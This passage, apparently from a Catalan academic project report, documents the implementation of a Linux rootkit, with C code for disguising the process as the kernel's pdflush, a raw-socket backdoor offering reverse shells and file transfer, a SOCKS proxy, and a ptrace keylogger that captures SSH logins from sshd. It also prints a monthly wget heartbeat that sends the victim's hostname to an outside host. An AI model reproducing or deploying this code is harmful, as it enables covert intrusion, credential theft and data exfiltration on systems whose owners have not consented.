\subsection{Tasques programades}
Per portar a terme les tasques programades, el rootkit intenta llançar un script anomenat .daily, .weekly, o .monthly amb la periodicitat que el propi
nom de l'arxiu ens indica. Aquesta execució es realitza programant un alert diàriament, tot incrementant uns contadors de tal manera que quan hagi passat el temps, s'executarà l'script necessari utilitzant la crida ``system()'' 

Aquests scripts els busca en el directory arrel del home del rootkit (també demanat en el moment de la configuració), i en cas de no ser-hi, no passa res.
  
\subsection{Ocultació}
S'han implementat diferents tècniques per evitar que el  rootkit sigui detectat:
\begin{enumerate}
\item Executable i nom de procés igual que una runqueue del kernel de LINUX. \\
Per passar desapercebut, el fitxer s'anomena pdflush. D'aquesta manera, la sortida de la comanda top
visualitza igual les runqueues que el nostre procés. A més, l'executable quan és llençat, modifica la posició de memòria on es troba el nom del procés, i en canvia el contingut
per a [pdflush], que és com es representa la runqueue del kernel de Linux. Aquest nom és escollit en temps de compilació, i pot ser qualsevol altre per tal de permetre al
rootkit adoptar un altre nom per a amagar-se en altres sistemes operatius.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[void] @PYaL[rename_proc](@PYaJ[char] @PYbe[*]@PYbe[*]argv, @PYaJ[int] argc) {
    @PYaJ[int] i;
    @PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] argc; i@PYbe[+]@PYbe[+]) {
        memset(argv@PYZlb[]i@PYZrb[], @PYag[0], strlen(argv@PYZlb[]i@PYZrb[]));
        realloc(argv@PYZlb[]i@PYZrb[], strlen(PROCNAME)@PYbe[+]@PYag[1]);
        memcpy(argv@PYZlb[]i@PYZrb[], PROCNAME, strlen(PROCNAME)@PYbe[+]@PYag[1]);
    }
\end{Verbatim}
    \caption{launcher.c::rename\_proc()}
    \label{fig:laucner_rename_proc}
\end{figure}

\item Executable no referenciat des de /proc/self/exe, i chdir a l'arrel (directori /). \\
Per si algú sospita del nostre procés, ens interessa que no es trobin pistes de què realment no és un procés intern del sistema operatiu. Per aquest motiu, just al arrancar el rootkit,
aquest canvia de directori i passa al directori arrel. Un cop ja es troba en execució, aquest es mapeja en una altre posició de memòria, i elimina les antigues pàgines. D'aquesta manera, 
aconsegueix eliminar la referència de /proc/self/exe, i així posar-ho més dificil alhora de intentar localitzar on està l'executable en qüestió. 

\item Localització física del fitxer. \\
Per que el fitxer estigui força amagat, s'ha  buscat un path al sistema on rarament s'hi accedeixi. El
path escollit per defecte és /usr/share/zoneinfo/posix/America/Indiana/. / i és possible canviar-lo en 
les opcions de compilació.
\item Comunicació xifrada. \\
Un altre mètode d'ocultació és xifrar tot el trànsit que passa per la xarxa, de tal manera que ningú pogui veure de forma accidental o 
intencionada, que és el què està viatjant per la xarxa.
\item Eliminació de les variables d'entorn. \\
Al ser executat, el launcher elimina tota variable d'entorn per tal de que no es pugui tenir cap pista de què és el procés.
\item Connexions de xarxa no visibles. \\
Si s'utilitza el mode de comunicació raw, les connexions de xarxa no seran visibles des del sistema operatiu. L'única 
manera de donar-se compte d'elles seria analitzant el trànsit de xarxa.
\end{enumerate} 

 
\subsection{Heard beat}
Per implementar el heard beat, s'han utilitzat les tasques programades de periodicitat mensual. En l'script
.monthly, s'ha afegit la comanda:

\begin{Verbatim}[commandchars=@\[\]]
wget -q hostru.mine.nu/index.php?h@PYbe[=]@PYay[$(]hostname@PYay[)]
\end{Verbatim}

Aquesta comanda s'executarà mensualment, i realitzarà una petició contra una pàgina web, allotjada en un
servidor gratuït. Al realitzar la petició, aquesta quedarà contabilitzada juntament amb el hostname i la ip
on es troba el rootkit.

\subsection{Independència de la shell}
Per a aconseguir que el rootkit no depengui de quina shell té instal·lada el sistema on s'està executant, 
s'ha modificat la shell dash\footnote{Shell basada en ash, reescrita per debian que té la peculiaritat de ser
una shell a l'estil sh, però d'un tamany molt reduit.} per a poder-se afegir dintre del rootkit. \\

En el moment en què es compila el rootkit, aquest ens demana si volem incloure una shell dintre seu, i en
cas de voler, incorpora el codi basat en dash. Com sempre aquest codi també és estàtic i compilat utilitzant
la llibreria dietlibc. \\

Els canvis que han estat necessaris per tal d'incloure la shell dash en el rootkit, són uns canvis força
metòdics i que no aporten gaire valor afegit. En cas d'interessar, es pot consultar directament al codi.\\

\subsection{Proxy socks}
Per a afegir aquesta funcionalitat al nostre rootkit, s'ha intentat (igual que en el cas anterior) buscar
un software existent que ens ajudés una mica a afegir-hi la funcionalitat. El problema que hem tingut en el cas del servei de
socks és que els paquets disponibles ofereixen moltíssimes altres funcionalitats que nosaltres no
necessitem. Aquest mateix fet feia molt costós el modificar el codi per a tenir un servei socks simple, i 
per aquest motiu s'ha decidit implementar des de zero tot el protocol. Cal tenir en compte però,
que el protocol socks és un protocol força senzill. \\

El primer a fer ha estat buscar les especificacions formals del protocol\footnote{Les especificacions 
formals de la versió 4 no compten amb un rfc a ietf sinó que varen ser publicades per l'empresa NEC \url{http://ftp.icm.edu.pl/packages/socks/socks4/SOCKS4.protocol}.}. Un cop localitzades, i estudiades, s'ha decidit implementar la versió 4 i la versió 4a, ja 
que ofereixen exactament el què necessitem. \\

Com veurem a continuació, la diferència entre la versió 4 i 4a, rau en què la versió 4, el servei de socks
espera rebre una direcció on connectar-se, i en la 4a rep un domini que el propi servei de socks ha de
resoldre. Ambdues versions del protocol, en un primer moment, el client envia una capçalera, i un cop enviada,
si el servei de socks és capaç d'establir-hi una connexió, la connexió que ha inicilitzat el client es
transforma en la connexió que ha solicitat, sent el servidor socks un intermediari.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[void] @PYaL[pthread_socks](@PYaJ[void] @PYbe[*]sock) {
    @PYay[struct] message req;
    @PYay[struct] in_addr in;

    @PYaE[// read client packet]
    read((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](@PYay[struct] message));
    @PYaJ[char] buf@PYZlb[]@PYag[4]@PYZrb[];
    read((@PYaJ[int])sock, buf, @PYag[4]);
    print_message(@PYbe[&]req);

    @PYaE[// if client is using socks4a]
    in.s_addr @PYbe[=] req.dstip;
    @PYay[if] (strstr(inet_ntoa(in), @PYaB["]@PYaB[0.0.0]@PYaB["])) {
        @PYaJ[char] dstip4a@PYZlb[]@PYag[1024]@PYZrb[];
        read((@PYaJ[int])sock, dstip4a, @PYag[1024]);
        req.dstip @PYbe[=] resolve(dstip4a, @PYag[0]);
	}

    @PYaJ[int] sock2;
    @PYay[if] ((sock2 @PYbe[=] launcher_rcon(req.dstip, ntohs(req.dstport))) @PYbe[>] @PYag[0]) {
        debug(@PYaB["]@PYaB[Connected!]@PYao[\n]@PYaB["]);
        req.cd @PYbe[=] @PYag[90];
        write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
        socks_forward((@PYaJ[int])sock, sock2);
    } @PYay[else] {
        debug(@PYaB["]@PYaB[ERROR!]@PYao[\n]@PYaB["]);
        req.cd @PYbe[=] @PYag[91];
        write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
    }
\end{Verbatim}
    \caption{socksd.c::pthread\_socks()}
    \label{fig:socksd}
\end{figure}

En la figura \ref{fig:socksd} es mostra la funció més característica d'aquesta funcionalitat, ja que és 
la funció que interpreta les capçaleres socks4 i socks4a. En ella, podem veure com omplim l'estructura
message amb la capçalera que ens envia el client. Just després, es comproba si la destinació és una 
destinació vàlida o no, i en cas de no ser-ho, es llegeix més enllà de la capçalera on si espera trobar 
el nom DNS del host on establir la connexió. \\
Com podem veure, just abans de passar a reenviar incondicionalment tot el tràfic entre els dos cantons
de la conneixó, cal que enviem al client un missatge comunicant-li si la connexió s'ha pogut establir
o no.

\section{Entorn privilegiat}
En l'entorn privilegiat, el nostre rootkit s'aprofita de la possibilitat de poder utilitzar raw sockets 
per tal d'implementar modes de comunicació pensats per comunicar-se amb sistemes molt protegits i xarxes 
molt restrictives, així com de la possibilitat de debugar serveis del sistema. \\

Una descripció més conceptual del funcionament d'aquest protocol de comunicació, ha estat comentada en 
detall amb l'ajuda d'esquemes en la secció \ref{sec:disseny_mode_privilegiat} del capítol de disseny de la 
solució. Per al major 
aprofitament d'aquest punt, se'n recomana la lectura prèvia. \\

\subsection{Modes de comunicació}
Tal i com es pot veure en la figura \ref{fig:launcher_raw_daemon}, quan el rootkit es troba en execució en un entorn 
privilegiat, es troba executant un while on cada paquet de xarxa que arriba a la màquina (independentment
de si el port de destí està obert o no), la funció recvfrom el rep. Com que la majoria de paquets que
rebrà una màquina, no seran paquets nostres, ens interessa que aquesta funció tingui la menor latència 
possible per afectar el mínim possible a la màquina on s'executi el nostre rootkit. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
sock @PYbe[=] socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@PYay[if] (sock @PYbe[<] @PYag[0]) {
    debug(@PYaB["]@PYaB[Can't allocate raw socket]@PYao[\n]@PYaB["]);
    exit(@PYbe[-]@PYag[1]);
}

antidebug_obfuscate_analysis(@PYag[16]);

@PYay[while] (@PYag[1]) {
    size @PYbe[=] recvfrom(sock, @PYbe[&]p, @PYay[sizeof](p), @PYag[0], (@PYay[struct] sockaddr @PYbe[*]) @PYbe[&]raw, @PYbe[&]slen);
    @PYaE[// Si el tamany del paquet es el que toca]
    @PYay[if] (size @PYbe[=]@PYbe[=] @PYay[sizeof](@PYay[struct] packet)) {
        @PYaE[// I el password és correcte]
        @PYay[if] (@PYbe[!]memcmp(CLIENTAUTH, p.action.pass, @PYag[20])) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet d'autenticat (action: %d)]@PYao[\n]@PYaB["], p.action.action);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) 
            @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet de CHECK]@PYao[\n]@PYaB["]);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
        }
    }
}
\end{Verbatim}
    \caption{launcher.c::raw\_daemon()}
    \label{fig:launcher_raw_daemon}
\end{figure}

La primera comprovació que es fa, és la del tamany de paquet. Si el tamany de paquet rebut no és exactament
la dels nostres paquets, aquest paquet ja pot ser descartat. Gràcies a això, podem descartar la majoria de 
paquets que no van destinats al rootkit. En cas que un paquet ocupi exactament com els nostres paquets, 
caldrà comprobar si es tracta d'un paquet autenticat amb la contrasenya correcte o si es tracta d'una 
comprovació per veure si el rootkit es troba instal·lat.
(independentment de conèixer la contrasenya o no). \\

Un cop ens arribi un paquet autenticat, d'aquest se li extreu el tipus d'acció a portar a terme, i s'executa.

\subsubsection{Mode de comunicació REV}
En cas que en el paquet rebut sol·liciti realitzar una acció de tipus inversa, el primer que caldrà fer
és establir una connexió amb l'origen del paquet. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[case] REVUPLOAD:
	@PYay[if] (fork()) @PYay[return];
    debug(@PYaB["]@PYaB[Reverse uploading file]@PYao[\n]@PYaB["]);
    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
        launcher_upload(sock, sock, (@PYaJ[char] @PYbe[*])d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
        close(sock);
    }
    @PYay[break];
@PYay[case] REVDOWNLOAD:
	@PYay[if] (fork()) @PYay[return];
    debug(@PYaB["]@PYaB[Reverse downloading file]@PYao[\n]@PYaB["]);
    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
        launcher_download(sock, sock, (@PYaJ[char] @PYbe[*])d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
        close(sock);
    }
    @PYay[break];
@PYay[case] REVSHELL:
	@PYay[if] (fork()) @PYay[return];
    debug(@PYaB["]@PYaB[Launching reverse shell]@PYao[\n]@PYaB["]);
    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
        launcher_shell(sock, sock);
        close(sock);
    }
    @PYay[break];
\end{Verbatim}
    \caption{launcher.c::do\_action()}
    \label{fig:launcer_do_rev_action}
\end{figure}

Podem veure en la figura \ref{fig:launcer_do_rev_action} que aquesta connexió serà establerta utilitzant
la funció launcher\_rcon(), que un cop s'estableixi la connexió amb l'origen del paquet (s\_addr i port),
aquesta retorna un socket que serà utilitzat per a tota la comunicació. \\

Com podem veure, hem aconseguit justament el què voliem: que fos el launcher qui establís la connexió amb
el client.

\subsubsection{Mode de comunicació RAW}
En el cas d'una acció de tipus raw, el paquet pot ser de tres tipus diferents:
\begin{itemize}
\item Inicialització d'una acció.
\item Paquet de sessió (dades d'una sessió ja inicialitzada).
\item Finalització d'una sessió/acció.
\end{itemize}

Un paquet d'inicialització d'acció serveix (tal i com el nom indica) per inicialitzar una acció a través
d'una connexió RAW. \\

Per tal d'establir una connexió totalment raw, ens caldrà poder enviar paquets a part de rebre'n. Per fer 
això, cada sessió raw tindrà associat un procés encarregat de fer l'enviament raw dels paquets. \\

Això s'ha decidit fer d'aquesta manera principalment per dos motius. El primer motiu, ha estat deixar 
el màxim de lleuger el codi de la figura \ref{fig:launcher_raw_daemon}, ja que serà el què estarà en execució la majoria del temps.
El segon motiu, és que fent-ho així, aconseguim poder utilitzar exactament les mateixes funcions utilitzades
en els altres modes de comunicació, ja que aquest cop només cal que el procés que realitza l'acció 
comparteixi la pipe de lectura amb el procés que està constantment execució (que serà qui rebrà les dades
enviades pel client dintre paquets amb l'acció RAWSESSION), i compartir la pipe d'escriptura amb aquest altre
procés d'enviament de paquets que estarà pendent de si apareixen noves dades a la pipe, per a posar-les en
paquets raw autenticats i enviar-los cap al client.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[case] SHELL:
    debug(@PYaB["]@PYaB[Launching shell]@PYao[\n]@PYaB["]);
    @PYay[if] (@PYbe[!]getuid()) {
        debug(@PYaB["]@PYaB[Starting DirectRAW service]@PYao[\n]@PYaB["]);
        r @PYbe[=] create_rawsock_session(rawsocks, ip@PYbe[-]@PYbe[>]s_addr, sport, d@PYbe[-]@PYbe[>]port);
    	@PYay[if] (fork()) @PYay[return];
        launcher_shell(r@PYbe[-]@PYbe[>]r@PYZlb[]@PYag[0]@PYZrb[], r@PYbe[-]@PYbe[>]w@PYZlb[]@PYag[1]@PYZrb[]);
    	destroy_rawsock_session(r);
    } @PYay[else] {
    	@PYay[if] (fork()) @PYay[return];
        launcher_shell(sock, sock);
        close(sock);
    }
    @PYay[break];
\end{Verbatim}
    \caption{launcher.c::do\_action()}
    \label{fig:launcer_do_raw_action}
\end{figure}

Tal i com es pot veure a la figura \ref{fig:launcer_do_raw_action}, el primer que cal fer és crear la sessió utilitzant la funció
create\_rawsock\_session() que ens inicialitzarà un rawsocket. Un cop inicialitzat, disposarem de les dues 
pipes (una de lectura i una d'escriptura), que seran les utilitzades pel procés que executarà l'acció, 
igual que en els altres modes de comunicació s'utilitzaven els sockets.\\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[struct] rawsock {
    @PYaJ[unsigned] @PYaJ[short] dport;
    @PYaJ[unsigned] @PYaJ[short] sport;
    @PYaJ[unsigned] @PYaJ[long] host;
    @PYaJ[int] r@PYZlb[]@PYag[2]@PYZrb[];
    @PYaJ[int] w@PYZlb[]@PYag[2]@PYZrb[];
	@PYaJ[int] pid;
};
\end{Verbatim}
    \caption{raw.h::struct rawsock}
    \label{fig:struct_rawsock}
\end{figure}

L'estructura rawsock és la que conté tota la informació de la sessió. Com es pot veure a la figura \ref{fig:struct_rawsock},
aquesta estructura conté els dos parells d'enters que seran utilitzats per inicialitzar les dues pipes, i
un pid que serà on es guardarà l'identificador del nostre procés, encarregat de realitzar els enviaments. \\
En aquesta estructura també guardem el port origen, destí i ip origen de la connexió, que són utilitzats per 
identificar la sessió raw a la què fan referència els paquets de sessió raw que es van revent. Aquestes dades
també són utilitzades per saber on realitzar l'enviament. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[case] RAWSESSION:
    debug(@PYaB["]@PYaB[Raw session packet]@PYao[\n]@PYaB["]);
    r @PYbe[=] find_rawsock_session(rawsocks, ip@PYbe[-]@PYbe[>]s_addr, sport, d@PYbe[-]@PYbe[>]port);
    fill_rawsock_session(r, d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
    @PYay[return];
\end{Verbatim}
    \caption{launcher.c::do\_action()}
    \label{fig:launcer_rawsession}
\end{figure}

Finalment, podem observar a la figura \ref{fig:launcer_rawsession} que quan ens arriba un paquet de 
tipus rawssession, el què es fa, és buscar a quin rawsock fa referència utilitzant la funció 
find\_rawsock\_session(), i un cop localitzat, s'hi envien directament les dades rebudes.


 
\subsection{Keylogger}
La idea que hi havia a l'hora d'implementar el keylogger, era que aquest no s'implementés com a mòdul ni
utilitzant la injecció de codi en el kernel, ja que aquestes tècniques depenen molt de la versió de kernel que 
s'estigui utilitzant en un moment donat. Com que per aquesta funcionalitat disposem d'accés de root, podem
fer gairebé qualsevol cosa a nivell d'usuari, i per aquest motiu, pensavem que seria possible fer això sense recórrer
a codi del kernel.\\

Cal dir que l'objectiu principal per aquesta funcionalitat és el de permetre'ns recuperar el password de l'usuari
root o almenys la d'algun usuari del sistema. Per aquest motiu, el servei que s'ha posat com a objectiu, ha estat el OpenSSH\footnote{\href{http://www.openssh.com/}{Openssh} és 
el servei d'ssh utilitzat per excel·lència en els sistemes UNIX que permeten administrar i usar remotament una màquina de 
forma segura.}.
Aquest servei s'acostuma a trobar instal·lat a la majoria de màquines UNIX i permet a usuaris de sistema
autenticar-se per a usar i administrar la màquina. Cal tenir en compte que aquest servei és considerat segur,
ja que utilitza algoritmes criptogràfics molt segurs, així com claus públiques i privades.\\

La primera opció que es va seguir per tal de poder llegir els passwords dels usuaris que s'autentiquessin al sistema, va ser intentar 
interceptar totes les escriptures a els dispositius tipus tty o pts. Aquests dispositius són els què reben 
les dades ja en clar, i comuniquen el servei de Openssh amb la shell del sistema. \\
La idea era comprobar quins dispositius estava utilitzant l'ssh i començar a llegir d'ells. El problema que
varem tenir, és que si el nostre keylogger llegia del dispositiu, llavors l'aplicació en qüestió no revia les
dades, sinó que l'únic que les revia era el keylogger. El primer que es va intentar per arreglar això,
va ser intentar un cop llegides les dades, ser capaços de escriure-les a algun altre lloc per a què
l'aplicació les acabés rebent, el què passa és que el funcionament dels termianls tty y pts estan pensants
justament per evitar això.\\

En definitiva, aquesta tècnica permetria recuperar els passwords dels usuaris, però alhora deixa inhabilitat el servei denegant així 
totes les possibles noves connexions. \\

Amb la segona opció ja s'han obtingut uns resultats satisfactoris. Aquesta tracta de que el nostre keylogger debugui l'aplicació
en qüestió, podent així interceptar cada crida al sistema, i poder seguir l'execució del servei fins al moment
en què el servei intenta autenticar-se al sistema utilitzant les dades que el client de ssh li ha passat. \\

El funcionament del keylogger queda doncs resumit en aquests passos:
\begin{enumerate}
\item Busqueda del servei de Openssh.
\item Inici del debug interceptant totes les crides a sistema.
\item Traça de les crides clone i read.
\item Detecció de l'enviament d'un nom d'usuari i password.
\item Emmagatzemament de les dades capturades en un fitxer xifrat.
\end{enumerate}

El primer punt és la localització del procés sshd. Per trobar-lo s'ha utilitzat la cerca a través del
directori /proc. Es busca un procés que pengi del procés init, i que tingui el nom de sshd. \\

Un cop trobat aquest procés, el keylogger es canvia el nom de procés a el nom 
exacte que té el procés que vol debugar. Un cop fet això, cal attachar-s'hi utilitzant la crida de sistemes 
POSIX ``ptrace''. A partir d'aquest moment, es pot dir que estem debugant el servei. \\

Un cop attachat, el keylogger espera que el servei Openssh executi les crides a sistema clone() i read().
La crida clone() és utilitzada per a crear els nous processos que atendran les noves connexions en les què
hi haurà un usuari intentant-se autenticar. La crida read() és utilitzada per a llegir l'usuari i password
que l'usuari entra i amb els què es vol autenticar. \\

En el moment que el keylogger detecta que arriba una nova connexió, aquest s'attacha al nou procés creat
per a l'Openssh, i el segueix fins a rebre les dades d'autenticació (usuari i password). Un cop els té,
deixa de debugar el procés i li permet la seva normal execució. \\

Les dades capturades són emmagatzemades en un fitxer relatiu al home del rootkit anomenat ``.k\_sshd''. 
El contingut d'aquest fitxer està xifrat amb el mateix password que s'utilitza per xifrar el contingut
dels paquets de xarxa, així com per autenticar el client amb el launcher. Per tal de poder accedir de
manera fàcil al contingut en clar d'aquest fitxer, el propi launcher permet ser llançat per desxifrar
el fitxer ``.k\_sshd''.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[int] check_ssh_password(@PYaJ[unsigned] @PYaJ[char] @PYbe[*]buff, @PYaJ[int] len){
	@PYaE[// Password string is | uint | chars |]
	@PYay[if] (len @PYbe[>] @PYag[32] @PYbe[|]@PYbe[|] len @PYbe[<] @PYag[5]) @PYay[return] @PYag[0];

	@PYaE[// ptr points to the last char of the string]
	@PYaJ[unsigned] @PYaJ[char] @PYbe[*]ptr @PYbe[=] buff@PYbe[+]len@PYbe[-]@PYag[1];
	@PYay[while] (@PYbe[*]ptr @PYbe[!]@PYbe[=] @PYaT[0x00]) ptr@PYbe[-]@PYbe[-];

	antidebug_obfuscate_analysis(@PYag[11]);
	@PYaE[// Now we must have two bytes 0x00 at left and one < 0x0f at right]
	@PYay[if] ( @PYbe[*](ptr@PYbe[-]@PYag[1]) @PYbe[!]@PYbe[=] @PYaT[0x00] @PYbe[|]@PYbe[|] @PYbe[*](ptr@PYbe[-]@PYag[2]) @PYbe[!]@PYbe[=] @PYaT[0x00]) @PYay[return] @PYag[0];

	@PYaE[// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1]
	@PYay[if] (((buff@PYbe[+]len@PYbe[-]@PYag[1])@PYbe[-](ptr@PYbe[+]@PYag[1])) @PYbe[!]@PYbe[=] @PYbe[*](ptr@PYbe[+]@PYag[1])) @PYay[return] @PYag[0];

	@PYay[if] (useRc4) {
		rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])RC4KEY, @PYay[sizeof](RC4KEY), @PYbe[&]rc4_crypt);
		rc4(ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]), @PYbe[&]rc4_crypt);
	}
	write(@PYag[1], ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]));
	putchar(@PYac['\n']);

	@PYay[return] @PYag[1];
}
\end{Verbatim}
    \caption{keylogger.c::check\_ssh\_password()}
    \label{fig:keylogger_check_password}
\end{figure}
      
En la figura \ref{fig:keylogger_check_password} es mostra el tros de codi que comprova que l'string llegit és un string 
d'usuari o de password i en cas de ser-ho ho xifra i ho escriu al fitxer en qüestió, ja que previament 
s'hi ha mapejat el descriptor de fitxer 1. Aquesta funció és cridada quan s'intercepta un string llegit per
un read() per a comprobar que segueix el format que utilitza l'Openssh. \\

Com és evident, per tal de poder desenvolupar aquest keylogger per l'Openssh, ha calgut un gran estudi del 
comportament d'aquest software per ser capaços de detectar com i quan es transfereixen les dades d'usuari i
password. \\

En aquest anàlisis, ens varem donar compte que les dades en clar utilitzades durant l'autenticació, eren
transferides utilitzant un format en concret que és el què aquesta funció comprova. El format en qüestió
és TAG + LONGITUD + DADES, on les dades és un string. Tenint en compte que un password serà normalment més
curt que 255 caràcters, i que la longitud està expressada en 4 bytes, aquesta funció comprova que el format
es compleix. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
ptrace(PTRACE_SYSCALL, pid, @PYaX[NULL], @PYaX[NULL]);
exitPid @PYbe[=] wait(@PYbe[&]status);

antidebug_obfuscate_analysis(@PYag[3]);
@PYay[if] (WIFSTOPPED(status)) {
    @PYay[if] (WSTOPSIG(status) @PYbe[=]@PYbe[=] SIGCHLD) {
        ptrace(PTRACE_CONT, pid, @PYag[0], SIGCHLD);
        kill(pid, SIGSTOP);
    } @PYay[else] 
        @PYay[if] (WSTOPSIG(status) @PYbe[!]@PYbe[=] SIGTRAP @PYbe[&]@PYbe[&]  WSTOPSIG(status) @PYbe[!]@PYbe[=] SIGSTOP) {
        ptrace(PTRACE_CONT, pid, @PYag[0], WSTOPSIG(status));
        debug(@PYaB["]@PYaB[Acabant procés pare %d (%d)]@PYao[\n]@PYaB["], pid, WSTOPSIG(status));
        @PYay[break];
    }
    @PYay[else] {
        orig_eax @PYbe[=] ptrace(PTRACE_PEEKUSER, pid, @PYag[4] @PYbe[*] ORIG_EAX, @PYaX[NULL]);

        antidebug_obfuscate_analysis(@PYag[4]);
        @PYay[switch] (orig_eax) {
            @PYay[case] __NR_clone:
                @PYay[if](insyscall @PYbe[=]@PYbe[=] @PYag[0]) {
                    debug(@PYaB["]@PYaB[fork]@PYao[\n]@PYaB["]);
                    insyscall @PYbe[=] @PYag[1];
                } @PYay[else] {
                    insyscall @PYbe[=] @PYag[0];
                    eax @PYbe[=] ptrace(PTRACE_PEEKUSER, pid, @PYag[4] @PYbe[*] EAX, @PYaX[NULL]);
                    @PYay[if](@PYbe[!]fork()) {
                        lookForReads(eax);
                    }
\end{Verbatim}
    \caption{keylogger.c::main()}
    \label{fig:keylogger_main}
\end{figure}

En la figura \ref{fig:keylogger_main} podem veure com un cop ja estem attachats al procés principal del 
Openssh, anem seguin les diferents crides a sistema per trobar en aquest cas un clone(). En el moment
en que es retorni la crida clone(), capturem el valor del registre eax que correspon al pid del procés
fill o 0 en cas de ser el propi fill. Quan en el pare obtenim el pid del fill acabat de crear, saltem a la 
funció lookForReads() tot passant-li el nou pid a seguir. En aquest funció, es crearà un nou procés del 
nostre keylogger, que segurà exclusivament aquest nou procés que acaba de crear l'Openssh. En aquesta nova
connexió, ja serà on buscarem les dades que ens interessen. \\

Podem veure en la mateixa figura, que segons el signal que faci aturar el nostre procés, ens interessarà
que aquest arrivi al procés que estem debugant, o fins i tot, farà que deixem de debugar-lo ja que entendrem
que es vol aturar el servei. \\

Per acabar, comentar que aquest keylogger s'ha implementat només per i386 i funciona per tota la branca 
de l'Openssh de la versió 2.x. Tot i això, el fet de passar-la a x86\_64 no té complicació i es farà fora de 
l'àmbit del projecte. També comentar que la intenció és acabar-hi afegint nous serveis per a que el keylogger
sigui capaç de capturar informació d'altres fonts.

\subsection{Injecció de codi en memòria del nucli}
En el transcurs del projecte, l'equip que desenvolupa el kernel de Linux varen aplicar un 
patch\footnote{\href{Patch que evita l'ús de /dev/mem per accedir a la memòria}{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ae531c26c5c2a28ca1b35a75b39b3b256850f2c8}} que evita
l'accés a la memòria a través de /dev/mem quedant així totalment impossibilitada la tècnica que es volia 
utilitzar. 

